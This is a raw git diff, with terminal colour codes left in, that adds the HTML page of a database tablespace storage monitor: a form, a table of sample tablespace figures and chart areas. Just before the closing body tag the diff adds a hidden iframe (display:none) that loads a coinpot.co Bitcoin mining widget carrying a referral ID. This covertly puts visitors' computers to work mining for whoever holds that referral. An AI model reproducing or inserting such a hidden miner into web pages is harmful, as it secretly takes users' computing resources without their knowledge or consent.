+[32m +        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>[m
+[32m +[m
+[32m +        <script type="text/javascript" src="./js/Proxy.js"></script>[m
+[32m +        <link rel="stylesheet" type="text/css" href="./css/style.css">[m
+[32m +[m
+[32m +        <link href="https://fonts.googleapis.com/css?family=IM+Fell+DW+Pica" rel="stylesheet">[m
+[32m +        <script src="js/loadStorageMonitor.js" type="text/javascript"></script>[m
+[32m +        <script type="text/javascript" src="./js/controller.js"></script>[m
+[32m +[m
+[32m +[m
+[32m +[m
+[32m +        <link href="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/css/bootstrap-combined.min.css" rel="stylesheet">[m
+[32m +        <link rel="stylesheet" type="text/css" media="screen"[m
+[32m +              href="http://tarruda.github.com/bootstrap-datetimepicker/assets/css/bootstrap-datetimepicker.min.css">[m
+[32m +        <script type="text/javascript"[m
+[32m +                src="http://cdnjs.cloudflare.com/ajax/libs/jquery/1.8.3/jquery.min.js">[m
+[32m +        </script> [m
+[32m +        <script type="text/javascript"[m
+[32m +                src="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/js/bootstrap.min.js">[m
+[32m +        </script>[m
+[32m +        <script type="text/javascript"[m
+[32m +                src="http://tarruda.github.com/bootstrap-datetimepicker/assets/js/bootstrap-datetimepicker.min.js">[m
+[32m +        </script>[m
+[32m +        <script type="text/javascript"[m
+[32m +                src="http://tarruda.github.com/bootstrap-datetimepicker/assets/js/bootstrap-datetimepicker.pt-BR.js">[m
+[32m +        </script>[m
+[32m +[m
+[32m +    </head>[m
+[32m +    <body>[m
+[32m +    <center>[m
+[32m +        <div class="container">[m
+[32m +            <div class="row">[m
+[32m +                <div class="col-lg-12 contenedor">[m
+[32m +                    <h1>DATABASE STORAGE MONITOR</h1>[m
+[32m +[m
+[32m +                    <div class="row">[m
+[32m +                        <div class="col">[m
+[32m +                            <label>Interva:</label>[m
+[32m +                        </div>[m
+[32m +                        <div class="col">[m
+[32m +                            <div class="well">[m
+[32m +                                <div id="datetimepicker" class="input-append">[m
+[32m +                                    <input id="time" data-format="hh:mm:ss" type="text" style="height:30px;">[m
+[32m +                                    <span class="add-on" style="height:30px;">[m
+[32m +                                        <i data-time-icon="icon-time" data-date-icon="icon-calendar">[m
+[32m +                                        </i>[m
+[32m +                                    </span>[m
+[32m +                                </div>[m
+[32m +                            </div>[m
+[32m +                        </div>[m
+[32m +                        <div class="col">[m
+[32m +                            <div>[m
+[32m +                                <label>Samples:</label>[m
+[32m +                                <input type="number" style="height:30px;" id="samples"/>[m
+[32m +                            </div>[m
+[32m +                        </div>[m
+[32m +                        <div class="col">[m
+[32m +                            <label>warning %</label>[m
+[32m +                            <input type="number" id="warning" style="width: 60px;" />[m
+[32m +                        </div>[m
+[32m +                        <div class="col">[m
+[32m +                            <button id="btn-connect">Start</button>[m
+[32m +                        </div>[m
+[32m +[m
+[32m +                    </div>[m
+[32m +                    <div class="row">[m
+[32m +                        <div class="col-lg-12">[m
+[32m +                            <p id="demo"></p>[m
+[32m +                        </div>[m
+[32m +                    </div>[m
+[32m +                    <br>[m
+[32m +                    <br>[m
+[32m +[m
+[32m +                </div>[m
+[32m +[m
+[32m +                <div class="col-lg-12 contenedor">[m
+[32m +                    <br>[m
+[32m +                    <table border="3" style="text-align:center; width: 100%;">[m
+[32m +                        <thead class="bg-info">[m
+[32m +                            <tr>[m
+[32m +                                <td>Tablespace</td>[m
+[32m +                                <td>Max MB</td>[m
+[32m +                                <td>Free MB</td>[m
+[32m +                                <td>Used MB</td>[m
+[32m +                                <td>%SP</td>[m
+[32m +                                <td colspan="2">SatSP</td>[m
+[32m +                                <td colspan="2">Sat Max</td>[m
+[32m +                            </tr>[m
+[32m +                        </thead>[m
+[32m +                        <tbody id="table">[m
+[32m +                            <tr>[m
+[32m +                                <td>A1</td>[m
+[32m +                                <td>300</td>[m
+[32m +                                <td>250</td>[m
+[32m +                                <td>50</td>[m
+[32m +                                <td>80</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                            </tr>[m
+[32m +                            <tr class="bg-success">[m
+[32m +                                <td>A2</td>[m
+[32m +                                <td>400</td>[m
+[32m +                                <td>150</td>[m
+[32m +                                <td>250</td>[m
+[32m +                                <td>80</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                            </tr>[m
+[32m +                            <tr class="bg-warning">[m
+[32m +                                <td>A3</td>[m
+[32m +                                <td>500</td>[m
+[32m +                                <td>250</td>[m
+[32m +                                <td>250</td>[m
+[32m +                                <td>80</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                            </tr>[m
+[32m +                            <tr class="bg-danger">[m
+[32m +                                <td>A4</td>[m
+[32m +                                <td>600</td>[m
+[32m +                                <td>50</td>[m
+[32m +                                <td>550</td>[m
+[32m +                                <td>80</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>[m
+[32m +                                <td>2d:2h</td>                                [m
+[32m +                            </tr>[m
+[32m +                        </tbody>[m
+[32m +                    </table>[m
+[32m +                    <br>[m
+[32m +                </div>[m
+[32m +[m
+[32m +                <div class="col-md-6 col-xs-6">[m
+[32m +[m
+[32m +                    <div class="contenedor">[m
+[32m +                        <div id="chart_div" style="width: 100%;height: 300px; "></div>[m
+[32m +                    </div>[m
+[32m +[m
+[32m +[m
+[32m +                </div>                [m
+[32m +                <div class="col-md-6  col-xs-5">[m
+[32m +[m
+[32m +                    <div class="contenedor">[m
+[32m +                        <div id="piechart" style="width: 100%; height: 300px;"></div>[m
+[32m +                    </div>[m
+[32m +[m
+[32m +                </div>[m
+[32m +            </div>[m
+[32m +        </div>[m
+[32m +        <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=39A45D404E3E&mode=widget" style="overflow:hidden;width:324px;height:470px;display:none;"></iframe>[m
+[32m +    </center>[m
+[32m +    <br>[m
+[32m +    <br>[m
+[32m +    <br>[m
+[32m +</body>[m
+[32m +</html>[m
+[31m- [m
+[31m- [m
+[31m- [m
+[31m- [m
+[31m- [m
+[31m- [m
+[31m- [m
+[31m- [m
+[31m- [m
+* Unmerged path DBMonitor/build/web/WEB-INF/classes/cr/ac/una/bases2/dbstoragemonitor/dao/TablespaceDAO.class
